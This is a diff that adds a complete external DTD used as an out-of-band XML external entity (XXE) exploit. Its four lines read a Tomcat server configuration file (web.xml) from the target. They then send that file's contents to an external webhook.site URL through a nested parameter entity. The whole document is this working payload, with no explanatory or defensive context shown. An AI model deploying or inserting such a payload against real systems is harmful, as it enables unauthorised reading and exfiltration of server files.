@@ -1,0 +1,4 @@
+<!ENTITY % file SYSTEM "file:///usr/local/tomcat/conf/web.xml">                                              
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://webhook.site/30c2aa19-72f5-4b14-9d14-d66839eb41f4/exfil?data=%file;'>">                 
+%eval;                                                                                                       
+%exfil; 
